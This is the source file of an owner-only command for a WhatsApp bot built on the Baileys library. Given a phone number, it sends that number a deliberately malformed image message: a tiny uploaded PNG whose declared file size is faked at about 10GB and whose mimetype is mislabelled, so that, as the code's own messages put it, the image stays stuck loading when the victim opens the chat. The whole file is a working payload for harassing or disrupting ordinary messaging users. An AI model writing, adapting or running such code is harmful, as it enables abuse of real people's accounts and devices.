const fs = require('fs');
const settings = require('../../settings');
const logger = require('../../lib/logger');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

module.exports = {
    name: 'matrix',
    aliases: ['glitch', 'loop', 'infinite'],
    category: 'owner',
    description: 'Send an image that gets stuck on infinite loading',
    usage: '.matrix <number>',
    ownerOnly: true,
    react: '🟢',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}matrix 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `🟢 *Injecting Matrix Glitch to +${targetNum}...*` }, { quoted: mek });

        try {
            // 1. Create a tiny 1x1 pixel transparent image
            const tinyImageBuffer = Buffer.from(
                'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
                'base64'
            );

            // 2. Upload it to get a valid media path
            const upload = await conn.waUploadToServer(tinyImageBuffer, { fileEncSha256: null });

            // 3. Build the corrupted message protocol
            const message = generateWAMessageFromContent(jid, {
                imageMessage: {
                    url: upload.url,
                    mimetype: 'image/jpeg',
                    fileSha256: upload.fileSha256,
                    fileLength: 9999999999, // 🔥 10GB Fake file size (Causes infinite loading)
                    mediaKey: upload.mediaKey,
                    fileEncSha256: upload.fileEncSha256,
                    directPath: upload.directPath,
                    caption: '🟢 SYSTEM ERROR: MATRIX GLITCH',
                    jpegThumbnail: tinyImageBuffer
                }
            }, { userJid: conn.user.id });

            // 4. Send it
            await conn.relayMessage(jid, message.message, { messageId: message.key.id });
            
            await conn.sendMessage(chatId, { text: `✅ *Glitch Deployed!*\n\nWhen they open the chat, the image will be stuck loading forever.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[MATRIX] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: mek });
        }
    }
};